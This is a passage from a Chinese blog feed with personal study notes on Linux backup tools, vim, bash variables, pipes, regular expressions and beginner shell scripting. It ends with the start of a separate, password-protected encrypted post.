</li></ul><p><code>tar -zpcv -f /root/etc.tar.gz /etc</code>  备份 /etc</p><blockquote><p><strong>XFS 文件系统的备份与还原</strong></p></blockquote><p>XFS 文件系统备份  <strong>xfsdump</strong></p><p>xfsdump 的限制</p><ul><li>xfsdump 不支持没有挂载的文件系统备份！所以只能备份已挂载的</li><li>xfsdump 必须使用 root 的权限才能操作 （涉及文件系统的关系） </li><li>xfsdump 只能备份 XFS 文件系统</li><li>xfsdump 备份下来的数据 （文件或储存媒体） 只能让 xfsrestore 解析 </li><li>xfsdump 是通过文件系统的 UUID 来分辨各个备份文件的，因此不能备份两个具有相同UUID 的文件系统喔</li></ul><p>XFS 文件系统还原 <strong>xfsrestore</strong></p><p><code>mkisofs</code> 创建镜像文件</p><p><code>cdrecord</code> 光盘烧录工具</p><p><code>cpio</code>   可备份任何东西,包括设备文件,但必须结合类似 <code>find</code> 等可以找到文件名的指令来告知<code>cpio</code> 文件在哪儿</p><p><img src="https://i.loli.net/2020/01/30/GRTxbpySi1UDmw8.png" alt="第8章重点"></p><h1 id="0x09-vim-程序编辑器"><a href="#0x09-vim-程序编辑器" class="headerlink" title="0x09    vim 程序编辑器"></a>0x09    vim 程序编辑器</h1><p>所有的 Unix Like 的系统都会内置 vi 文书编辑器</p><p>vim 具有程序编辑的能力,可以主动的以字体颜色辨别语法的正确性,方便程序设计</p><p>程序简单,编辑速度相当快速</p><p><strong>很多个别软件的编辑接口会主动调用vi</strong></p><blockquote><p>vim 是 vi 的进阶版, vim 可以用颜色或底线等方式来显示一些特殊信息;vim 会依据文件的扩展名或者是文件内的开头信息,判断该文件的内容而自动的调用该程序的语法判断式，再以颜色来显示程序码与一般信息.</p></blockquote><blockquote><p><strong>vi 的使用</strong></p></blockquote><p>vi 分为三种模式, 分别是”一般指令模式” , “编辑模式” , “命令行命令模式”</p><p>1)一般指令模式(command mode)</p><p><strong>以 vi 打开一个文件就直接进入一般指令模式</strong>了（这是<strong>默认的模式</strong>，也简称为一般模式）。在 这个模式中， 你可以使用“上下左右”按键来移动光标，你可以使用“删除字符”或“删除整列”来处理文件内容， 也可以使用“复制、贴上”来处理你的文件数据</p><p>2)编辑模式(insert mode)</p><p>因为一般模式都无法编辑文件的内容, 必须要按下”i,;o,O,a,A,r,R”等任何一个字母之后才能进入编辑模式.</p><p>编辑模式 会出现 <code>INSERT</code> 或者 <code>REPLACE</code>字样.按下<code>ESC</code> 可以回到一般指令模式</p><p>3)命令行命令模式(command-line mode)</p><p>在一般模式中,输入<code>:/?</code> 中的任何一个按钮,就可以将光标移到到最下面那一列 ,可以进行 数据搜寻,读取,存盘,取代字符,离开vi等等操作</p><p><img src="https://i.loli.net/2020/01/30/bpkGCUmD72z8Iyt.png" alt="三种模式之间的关系"></p><p><code>:wq</code> 表示 可存盘并离开( write quit)</p><p><code>:wq!</code> 表示”强制写入”</p><p>按键说明</p><p><img src="https://i.loli.net/2020/01/30/rmjiIJnEXUQ1SYx.png" alt></p><p><img src="https://i.loli.net/2020/01/30/EM29OfBXzmcNA3L.png" alt></p><p><img src="https://i.loli.net/2020/01/30/hTC1GnEf4McwS8g.png" alt></p><p><img src="https://i.loli.net/2020/01/30/ncaUt7iLjhv3rmP.png" alt></p><p><img src="https://i.loli.net/2020/01/30/4IxmY7wDqoRVc2M.png" alt="一般指令模式切换到命令行界面的可用按钮"></p><p>下面列出在编辑过程中常用的</p><p>按<code>U</code>可恢复上一次修改状态, <code>set nu</code> 在左侧显示行号</p><p><code>G</code>可找到对应行数默认为第一列,<code>num+yy</code> 表示复制num列,<code>p</code> 粘贴</p><blockquote><p><strong>vim 的暂存盘, 救援恢复与打开时的警告信息</strong></p></blockquote><p>当我们在使用 vim 编辑时， vim 会在与被编辑的文件的目录下，再创建一个名为 <strong>.filename.swp</strong> 的文件</p><p>这个 <code>.swp</code>文件在CTF题目中会遇到,因此遇见了就应该拿回vim进行代码复原 <code>vim -r</code> </p><blockquote><p> <strong>vim 的额外功能</strong></p></blockquote><p>vim 支持许多的程序语法( syntax ) , 使用 vim 可以进行除错(debug)的功能</p><blockquote><p><strong>vim 进行区块选择(Visual Block)</strong></p></blockquote><p><img src="https://i.loli.net/2020/01/30/hVSfiG9uNedq6o7.png" alt></p><blockquote><p><strong>vim 多文件编辑</strong></p></blockquote><p><code>:n</code> 编辑下一个文件</p><p><code>:N</code> 编辑上一个文件</p><p><code>:files</code> 列出目前这个vim打开的所有文件</p><blockquote><p><strong>多窗口功能</strong></p></blockquote><p><code>:sp</code></p><p><img src="https://i.loli.net/2020/01/30/FlIZ1f63yb5k2Rc.png" alt></p><blockquote><p><strong>vim 的挑字补全功能</strong></p></blockquote><p><img src="https://i.loli.net/2020/01/30/VAvycDJg8bBkw3q.png" alt></p><blockquote><p><strong>vim 环境设置</strong></p></blockquote><p><img src="https://i.loli.net/2020/01/30/tYKrWGjh8Np3qgX.png" alt></p><blockquote><p>所谓的缩排，就是当按下 Enter 编辑新的一列时，光标不会在行首，而是在与上一列的第一个非空白字符处对齐</p></blockquote><p>DOS 与 Linux 的断行字符</p><p>DOS 使用的断行字符为<code>^M$</code> ,即<code>CR</code>与<code>LF</code> 而Linux下 只有<code>LF($)</code>这个断行符号</p><p>使用<code>unix2dos</code> 或 <code>dos2unix</code> 来转换断行格式</p><p>语系转码问题</p><p> <code>iconv -f big5 -t utf8 vi.big5</code></p><p><code>-f</code> 指的是原来的编码 <code>-t</code> 指的是 新编码  然后+文件名 </p><p><code>-o</code> 是新的文件名(要保留原来的文件的情况使用)</p><p><img src="https://i.loli.net/2020/01/30/iqQX6O8cD7KVnE1.png" alt="第9章重点"></p><h1 id="0x10-认识与学习BASH"><a href="#0x10-认识与学习BASH" class="headerlink" title="0x10    认识与学习BASH"></a>0x10    认识与学习BASH</h1><p><img src="https://i.loli.net/2020/01/30/TnsacRzuO1mrQAB.png" alt></p><p><strong>能够操作应用程序的接口都能够称为壳程序</strong>狭义的壳程序指的是命令行方面的软件，包括本章要介绍的 bash 等广义的壳程序则包括图形接口的软件</p><p>在历史上,shell的版本众多.Linux使用的则是<code>Bourne Again SHell</code>简称<code>bash</code> 这个shell是Bourne Shell的增强版本,也是基准与GNU的架构下发展出来的</p><p>第一个流行的 shell 是由 Steven Bourne 发展出来的，为了纪念他所以就称为 Bourne shell ，或直接<strong>简称为 sh</strong></p><blockquote><p>Bash shell 的功能</p></blockquote><p>命令编修能力(history)</p><p>即我们可以查看我们以前输入的指令,并且默认的指令记忆功能可以到达<strong>1000</strong>个,记录到<code>.bash_history</code>中(在CTF题目中也出现过)</p><p>命令与文件补全功能(tab)</p><ul><li>[Tab] 接在一串指令的第一个字的后面，则为命令补全； </li><li>[Tab] 接在一串指令的第二个字以后时，则为“文件补齐”</li></ul><p>命令别名设置功能(alias)</p><p>例如: </p><pre><code>alias lm=&#39;ls -al&#39; </code></pre><p>就表示 使用lm 代替 <code>ls -al</code>这个指令</p><p>工作控制,前景背景控制(job control,foreground,background)</p><p>具体会在第16章学习</p><p><strong>程序化脚本 (shell scripts</strong>)</p><p>在DOS中,将一堆指令写在一起就是”批处理文件”</p><p>在 Linux 下面的 shell scripts 则发挥更为强大的功能，可以将你平时管理系统常需要下达的连续指令写成一个文 件， 该文件并且可以通过对谈互动式的方式来进行主机的侦测工作,也可以利用shell提供的环境变量及相关指令进行设计</p><p>万用字符(Wildcard)</p><p>比如查询以X开头的文件,<code>ls -l /usr/bin/X*</code>即可</p><p>使用 <code>type</code> 来查询指令是否为 Bash shell 内置的指令</p><ul><li><p>：不加任何选项与参数时，type 会显示出 name 是外部指令还是 bash 内置指令 </p></li><li><p>-t ：当加入 -t 参数时，type 会将 name 以下面这些字眼显示出他的意义： </p><p>file ：表示为外部指令； </p><p>alias ：表示该指令为命令别名所设置的名称； </p><p>builtin ：表示该指令为 bash 内置的指令功能； </p></li><li><p>-p ：如果后面接的 name 为外部指令时，才会显示完整文件名； </p></li><li><p>-a ：会由 PATH 变量定义的路径中，将所有含 name 的指令都列出来，包含 alias </p></li></ul><p>指令的下达与快速编辑按钮</p><blockquote><p><strong>Shell 的变量功能</strong></p></blockquote><p><strong>1)变量的可变性与方便性</strong></p><p><img src="https://i.loli.net/2020/01/31/b5n1kFuD3TOX9dh.png" alt></p><p><strong>2)影响bash环境操作的变量</strong></p><p>之前也提到过,就是PATH这个变量,等</p><p><strong>3)脚本程序设计(shell script) 的好帮手</strong></p><p><img src="https://i.loli.net/2020/01/31/Xo6VBPSJRDdzHYb.png" alt></p><hr><blockquote><p>变量的利用与设置 echo, 变量设置规则, unset</p></blockquote><p>使用<code>echo</code>指令读取变量;比如<code>echo $PATH</code>或者<code>${变量}</code>的方式</p><p>在bash中, 当一个变量名称尚未被设置时,默认的内容是”空”</p><p><img src="https://i.loli.net/2020/01/31/iYhSvs4FnZKTbJQ.png" alt="变量的设置规则"></p><p>其中 利用” ``” 来执行在CTF中有考察</p><p><strong>子程序</strong>,在我目前这个 shell 的情况下,去启用另一个新的 shell,新的那个 shell 就是子程序</p><blockquote><p>在变量的设置当中，单引号与双引号的用途有何不同？ 答：单引号与双引号的最大不同在于双引号仍然可以保有变量的内容，但单引号内仅能是一般字符 ，而不会有特殊符号。 </p></blockquote><p><strong>使用单引号的时候，那么 $name 将失去原有的变量内容，仅为一般字符的显示型态而已</strong></p><hr><p>环境变量的功能</p><p>查询默认的环境变量可以通过<code>env</code>和<code>export</code> 两个指令</p><p>使用<code>set</code> 来观察所有变量</p><p><code>$</code> 也是一个变量, 代表”目前这个Shell的线程代号”,即PID(processs id),获取PID <code>echo $$</code></p><p><code>?</code> 变量代表<strong>上一个执行的指令</strong>所<strong>回传的值</strong>,一般来说,如果超过执行该指令,则会回传一个<code>0</code>值,如果执行发生错误,就会回传一个”错误代码”,一般以非0的数值来取代</p><p><code>export</code> 自订变量转成环境变量</p><p><img src="https://i.loli.net/2020/01/31/HNrievVgOAaxoFm.png" alt></p><p><code>locale</code> 变量 影响显示结果的语系变量</p><p>有父程序与子程序的不同程序关系时， 则“变量”可否被引用与export 有关。被 export 后的变量，我们可以称他为“环境变量”,环境变量可以被子程序所引用，但是其他的自订变量内容就不会存在于子程序中</p><p><code>read</code> 读取来自键盘输入的变量</p><p><code>declare/typeset</code> 宣告变量的类型</p><ul><li>-a ：将后面名为 variable 的变量定义成为阵列 （array） 类型 </li><li>-i ：将后面名为 variable 的变量定义成为整数数字 （integer） 类型 </li><li>-x ：用法与 export 一样，就是将后面的 variable 变成环境变量； </li><li>-r ：将变量设置成为 readonly 类型，该变量不可被更改内容，也不能 unset</li></ul><blockquote><p>变量类型默认为“字串”，所以若不指定变量类型，则 1+2 为一个“字串”而不是“计算式”。 </p><p>所以上述第一个执行的结果才会出现那个情况的.bash 环境中的数值运算，默认最多仅能到达整数形态，所以 1/3 结果是 0</p></blockquote><p><code>ulimit</code> 与文件系统及程序的限制关系</p><p><code>Optional</code> 变量内容的删除,取代与替换</p><p><img src="https://i.loli.net/2020/01/31/RGL93lx65JXiAtQ.png" alt="变量删除"></p><p>使用<code>alias</code> <code>unalias</code> 指令来进行别名设置</p><p>使用<code>history</code> 指令来查看历史命令</p><ul><li>n ：数字，意思是“要列出最近的 n 笔命令列表”的意思</li><li>-c ：将目前的 shell 中的所有 history 内容全部消除 </li><li>-a ：将目前新增的 history 指令新增入 histfiles 中，若没有加 histfiles ， 则默认写入 ~/<strong>.bash_history</strong> </li><li>-r ：将 histfiles 的内容读到目前这个 shell 的 history 记忆中； </li><li>-w ：将目前的 history 记忆内容写入 histfiles 中</li></ul><p><img src="https://i.loli.net/2020/01/31/PZ6rLqHkMCpAjQv.png" alt></p><p><code>source</code> 读入环境配置文件的指令</p><hr><p>终端机的环境设置 : stty ,set</p><ul><li>intr : 送出一个 interrupt （中断） 的讯号给目前正在 run 的程序 （就是终止啰！）</li><li>quit : 送出一个 quit 的讯号给目前正在 run 的程序</li><li>erase : 向后删除字符</li><li>kill : 删除在目前命令行上的所有文字 </li><li>eof : End of file 的意思，代表“结束输入”。</li><li>start : 在某个程序停止后，重新启动他的 output </li><li>stop : 停止目前屏幕的输出 </li><li>susp : 送出一个terminal stop 的讯号给正在run的程序</li></ul><p><img src="https://i.loli.net/2020/01/31/JphlKWirBsCID5E.png" alt="组合按键"></p><p><img src="https://i.loli.net/2020/01/31/2onRUkdwyQ1gHz4.png" alt="万用字符"></p><p><img src="https://i.loli.net/2020/01/31/mYFxgeoULd3fwj6.png" alt="特殊符号"></p><hr><blockquote><p><strong>数据流重导向</strong>(redirect)</p></blockquote><p><img src="https://i.loli.net/2020/01/31/Z93d5DrQix1bp6H.png" alt="指令的执行情况"></p><p>standard output 与 standard error output 分别代表“标准输出 （STDOUT）”与“标准错误输出 （STDERR）,是默认输出到屏幕上的</p><p><strong>数据流重导向可以将 standard output （简称 stdout） 与 standard error output （简称 stderr）分别传送到其他的文件或设备去</strong></p><p>分别传送所用的特殊字符有</p><p>1) 标准输入(stdin):代码为0,使用 &lt; 或者 &lt;&lt; ;</p><p>2)标准输出(stdout):代码为1, 使用 &gt; 或者 &gt;&gt;;</p><p>3)标准错误输出(stderr):代码为2,使用2&gt; 或者 2&gt;&gt;;</p><p><strong>若以 &gt; 输出到一个已存在的文件中，那个文件就会被覆盖掉, &gt;&gt; 以累加的方式输出</strong></p><blockquote><p><strong>命令执行的判断依据</strong></p></blockquote><p><code>;</code> <code>&amp;&amp;</code> <code>||</code></p><p>一次执行多条执行(不考虑指令相关性的连续指令下达)</p><p><code>cmd;cmd</code> 命令与命令之间利用分号<code>;</code>来隔开</p><p><code>$?(指令回传值)</code> 与<code>$$</code>或<code>||</code></p><p><img src="https://i.loli.net/2020/01/31/pW85ByEmuDKwxaV.png" alt></p><hr><blockquote><p><strong>管线命令(pipe)</strong></p></blockquote><p>管线命令(管道命令)使用的是<code>|</code>这个界定符号,管线命令只能处理前面一个指令传来的正确信息(standard output)</p><p><img src="https://i.loli.net/2020/01/31/gq9PNpK2TulWkA7.png" alt></p><p>并且每个管线后面接的第一个数据必定是”指令”,这个指令必须能够接受 standard input 的数据才行.<code>ls,cp,mv</code>等就不是管线命令了.因为他们并不能接受来自stdin的数据</p><p>使用管线(管道)命令需要注意的地方</p><ul><li>管线命令仅会处理 standard output，对于 standard error output 会予以忽略 </li><li>管线命令必须要能够接受来自前一个指令的数据成为 standard input 继续处理才行</li></ul><p>使用<code>cut</code> <code>grep</code> 来撷取命令</p><p>即将一段数据经过分析后,取出我们想要的</p><p>cut是从<strong>一行</strong>信息中,取出我们想要的.而grep是分析一行信息,只取出我们我们所需要的信息</p><ul><li>-a ：将 binary 文件以 text 文件的方式搜寻数据 </li><li>-c ：计算找到 ‘搜寻字串’ 的次数 </li><li>-i ：忽略大小写的不同，所以大小写视为相同 </li><li>-n ：顺便输出行号 </li><li>-v ：反向选择，亦即显示出没有 ‘搜寻字串’ 内容的那一行</li><li>–color=auto ：可以将找到的关键字部分加上颜色的显示喔</li></ul><p>排序命令 <code>sort wc uniq</code></p><p>双向重导向 <code>tee</code></p><p><img src="https://i.loli.net/2020/01/31/Iw6Jm19Yk4n5jNR.png" alt></p><p><code>tee</code>会同时将数据流分送到文件和屏幕</p><p>字符转换命令 <code>tr</code> <code>col</code> <code>join</code> <code>paste</code> <code>expand</code></p><p><code>tr</code> 可以用来删除一段讯息当中的文件,或者是进行文章讯息的替换</p><p><code>col</code> 可以将[tab]键取代为空白键</p><p><code>join</code> 用于处理两个文件之间的数据,而且,主要是在处理”<strong>两个文件当中有相同数据的哪一行</strong>,才将他加在一起</p><p><code>paste</code>因为join指令必须要比对两个文件的数据相关性,而paste就直接将两行贴在一起,中间以[tab]键隔开</p><p><code>expand</code></p><p>将[tab]键转成空白键</p><p>分区命令 <code>split</code></p><ul><li>-b ：后面可接欲分区成的文件大小，可加单位，例如 b, k, m 等； </li><li>-l ：以行数来进行分区。 </li><li>PREFIX ：代表前置字符的意思，可作为分区文件的前导文字。</li></ul><p>参数代换 <code>xargs</code></p><p>x代表 加减乘除的乘号,args是arguments,参数的意思</p><p><code>-</code>减号的作用</p><blockquote><p>在管线命令当中，常常会使用到前一个指令的 stdout 作为这次的 stdin ， 某些指令需要用到文件名称 （例如 tar） 来进行处理时，该 stdin 与stdout 可以利用减号 “-“ 来替代</p></blockquote><p>举例: </p><pre><code>mkdir /tmp/homeback tar -cvf - /home &amp;#124; tar -xvf - -C /tmp/homeback</code></pre><blockquote><p>将 /home 里面的文件给他打包，但打包的数据不是纪录到文件，而是 传送到 stdout； 经过管线后，将 tar -cvf - /home 传送给后面的 tar -xvf - ”。后面的这个 - 则 是取用前一个指令的 stdout， 因此，我们就不需要使filename</p></blockquote><p><img src="https://i.loli.net/2020/01/31/1ZxDQTYNoXzhnvd.png" alt="本章重点"></p><h1 id="0x11-正则表达式与文件格式化处理"><a href="#0x11-正则表达式与文件格式化处理" class="headerlink" title="0x11    正则表达式与文件格式化处理"></a>0x11    正则表达式与文件格式化处理</h1><p>正则表达式 ( Regular Expression,RE)是通过一些特殊字符的排列,用来”搜寻/取代/删除”一列或者多列文字字串</p><p>学习目的 : <strong>使用者至少要能看的懂正则表达式的意义</strong></p><p>基础正则表达式</p><p><img src="https://i.loli.net/2020/01/31/FNPWXgG7OVUd31R.png" alt></p><p>grep 的一些进阶选项</p><ul><li>-A ：后面可加数字，为 after 的意思，除了列出该行外，后续的 n 行也列出来； </li><li>-B ：后面可加数字，为 befer 的意思，除了列出该行外，前面的 n 行也列出来； </li><li>–color=auto 可将正确的那个撷取数据列出颜色</li></ul><p>grep最重要的功能就是进行字串数据的比对，然后将符合 </p><p>使用者需求的字串行印出来</p><p><code>^</code>在<code>[]</code>之外代表定位在行首的意义,在之内代表<strong>“反向选择”</strong></p><p>使用<code>\.$</code> 来选择以<code>.</code>结尾的那一行,因为小数点有其他意义,所以必须使用跳脱字符(转义字符)<code>\</code> 来解除其特殊意义</p><p>使用<code>^$</code>来匹配空白行,因为只有行首和行尾(^$)</p><p><code>.</code> 小数点 代表”一定有一个任意字符”的意思</p><p><code>*</code> 代表重复前一个字符,0到无穷次的意思</p><p><code>{}</code> 可以用来限定范围 但是因为{与}符号在shell是有特殊意义的,因此也需要用<code>\</code>来进行转义</p><p><img src="https://i.loli.net/2020/01/31/wNCXbOqpJRHjhzB.png" alt="基础正则表达式字符汇整"></p><blockquote><p>延伸正则表达式</p></blockquote><p><img src="https://i.loli.net/2020/01/31/wNCXbOqpJRHjhzB.png" alt></p><p>在单引号内的<code>|</code> 表示 <code>或</code></p><hr><blockquote><p>文件的格式化与相关处理</p></blockquote><p><code>printf</code> 用于格式化输出,和C语言中用法类似</p><p><code>awk</code>的用法</p><p>awk ‘条件类型1{动作1} 条件类型2{动作2} …’ filename</p><p>awk 的内置变量</p><p><code>NF</code> 代表 每一行($0) 拥有的字段总数</p><p><code>NR</code> 目前awk所处理的是第几行数据</p><p><code>FS</code> 目前的分隔字符,默认空白键</p><p>在awk中<code>==</code> 才代表等于 </p><hr><p>文件比对工具</p><p><code>diff</code>  </p><ul><li><p>from-file ：一个文件名，作为原始比对文件的文件名； </p></li><li><p>to-file ：一个文件名，作为目的比对文件的文件名； </p><p>注意，from-file 或 to-file 可以 - 取代，那个 - 代表“Standard input”之意。 </p></li><li><p>-b ：忽略一行当中，仅有多个空白的差异（例如 “about me” 与 “about me” 视为相同 </p></li><li><p>-B ：忽略空白行的差异。 </p></li><li><p>-i ：忽略大小写的不同。 </p></li></ul><p><code>cmp</code> 以”字节”为单位去比对</p><p><code>patch</code>  用diff制作出来的比较文件通常使用的扩展名为<code>.patch</code> </p><p><code>pr</code> 文件打印准备</p><p><img src="https://i.loli.net/2020/01/31/qrNHlSvU2RXYwIh.png" alt="本章重点"></p><h1 id="0x12-学习-Shell-Scripts"><a href="#0x12-学习-Shell-Scripts" class="headerlink" title="0x12    学习 Shell Scripts"></a>0x12    学习 Shell Scripts</h1><p>什么是shell? 在BASH中已经讲过了,就是在命令行下面让我们与系统沟通的一个工具接口,script 即脚本. 那么,Shell Scripts 就是针对shell所写的脚本(程序)</p><blockquote><p>其实， shell script 是利用 shell 的功能所写的一个“程序 （program）”，这个程序是使用纯文本文件，将一些 shell 的语法与指令（含外部指令）写在里面， 搭配正则表达式、管线命令与数据流重导向等功能，以达到我们所想要的处理目的</p></blockquote><p>shell script 就像是早期DOS年的批处理文件(.bat)</p><p>为什么 shell script 对于玩Linux很重要?</p><ul><li>自动化管理的重要依据</li><li>追踪与管理系统的重要工作</li><li>简单入侵侦测功能</li><li>连续指令单一化</li><li>简易的数据处理</li><li>跨平台支持与学习历程较短</li></ul><p>用shell 写一个hello world 程序</p><pre class=" language-shell"><code class="language-shell">#!/bin/bash 宣告这个script使用的shell名称#Program:#       this program shows "Hello World!" in your screnn.#History:   这些都是程序的说明#2020/01/31 IFONLY First releasePATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin 主要环境变量的宣告export PATHecho -e "Hello World! \a \n"exit 0          </code></pre><p>写 shell script 的良好习惯,在文件开始处记录</p><ul><li>script 的功能</li><li>script 的版本信息</li><li>script 的作者与联络方式</li><li>script 的版权宣告方式</li><li>script 的History</li><li>script 运行时需要的环境变量预先预告和设置</li></ul><pre class=" language-shell"><code class="language-shell">#!/bin/bash#Program:#       This program shows your full name #History:#2020/01/31 IFONLY First releasePATH=/bin:/sbin:/usr:/sbin:/usr/local/bin:/usr/local/sbin:~/binexport PATHread -p "Please input your first name: " firstnameread -p "Please input your last name: " lastnameecho -e "\nYour full name is: ${firstname} ${lastname}"</code></pre><p>输出用户名</p><p>shell script 进行数值运算只支持整型的,可以使用<code>declare</code> 来定义变量的类型</p><p><code>var=$((运算内容))</code> </p><blockquote><p><strong>script 的执行方式差异</strong>(source,sh script, ./script)</p></blockquote><p><code>source</code> 在父程序中执行</p><hr><p>使用<code>test</code> 指令进行测试</p><p><img src="https://i.loli.net/2020/01/31/f26Pp4ONHSXFh8r.png" alt></p><p><img src="https://i.loli.net/2020/01/31/XRWcuVJPQbtTBU8.png" alt></p><p><img src="https://i.loli.net/2020/01/31/ROhgzP8Iveb1pQY.png" alt></p><p>利用判断符号<code>[]</code></p><p><code>[&quot;xxx&quot;==&quot;xxxx&quot;]</code></p><p><strong>Shell script 的默认变量 ($0,$1)</strong></p><pre><code>/path/to/scriptname opt1 opt2 opt3 opt4 $0                     $1      $2    $3  $4 </code></pre><p><code>shifi</code> 造成参数变量号码偏移</p><hr><blockquote><p>条件判断式</p></blockquote><p><code>if ... then</code></p><ul><li>单层, 简单条件判断式</li></ul><p>if [条件判断式]; then</p><p>​        条件成立,执行的指令</p><ul><li>&amp;&amp; 代表 AND ;</li><li>|| 代表 or ;</li></ul><blockquote><p>多重,复杂条件判断式</p></blockquote><p># 一个条件判断，分成功进行与失败进行 （else） </p><p>if [ 条件判断式 ]; then </p><p>当条件判断式成立时，可以进行的指令工作内容； </p><p>else</p><p>当条件判断式不成立时，可以进行的指令工作内容； </p><p>fi </p><p>较多层次( elif)</p><p>常见端口(port) 所对应的网络服务</p><ul><li><strong>80: WWW</strong> </li><li><strong>22: ssh</strong> </li><li><strong>21: ftp</strong> </li><li>25: mail </li><li>111: RPC（远端程序调用） </li><li>631: CUPS（打印服务功能）</li></ul><p>利用 <strong>case … … esac</strong> 判断</p><p>利用<strong>function</strong> 功能</p><p>函数可以在 shell script 当中做出一个类似自订执行指令的东西，最大的功能是， 可以简化我们很多的程序码</p><pre><code>function fname（） { 程序段 } </code></pre><p>循环 (<strong>loop</strong>)</p><p>除了if…then…fi 这种条件判断式之外,还有循环.循环可以不断的执行某个程序段落,直到使用者设置的条件达成为止;</p><p><strong>while do done, until do done</strong> (不定循环)</p><pre><code>while [ condition ] &lt;==中括号内的状态就是判断式 do &lt;==do 是循环的开始！ 程序段落 done &lt;==done 是循环的结束</code></pre><p>另外一种</p><pre><code>until [ condition ] do 程序段落 done </code></pre><p><strong>for … do ..done</strong> (固定循环)</p><pre><code>for var in con1 con2 con3 ... do 程序段 done </code></pre><p>for 这种语法,则是” 已经知道要循环多少次” 的状态</p><p>有点像Python 的<code>for i in range</code></p><p><strong>for …do…done</strong> 的数值处理</p><pre><code>for （（ 初始值; 限制值; 执行步阶 ）） do 程序段 done </code></pre><p>这种方法适合用于 数值方式的运算当中, for中的内容和C的for类似</p><hr><p><strong>shell script 的追踪与debug</strong></p><p>bash的相关参数</p><ul><li>-n ：不要执行 script，仅查询语法的问题 </li><li>-v ：再执行 script 前，先将 scripts 的内容输出到屏幕上</li><li>-x ：将使用到的 script 内容显示到屏幕上，这是很有用的参数</li></ul><p><img src="https://i.loli.net/2020/01/31/PrqT9MuwCtK6JUH.png" alt="本章重点"></p><p>肚子好饿~</p><p><img src="https://i.loli.net/2020/02/01/lDvYFTsmVg1475B.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Forever Mamba,Forever Legend</title>
      <link href="/posts/20200127/"/>
      <url>/posts/20200127/</url>
      
        <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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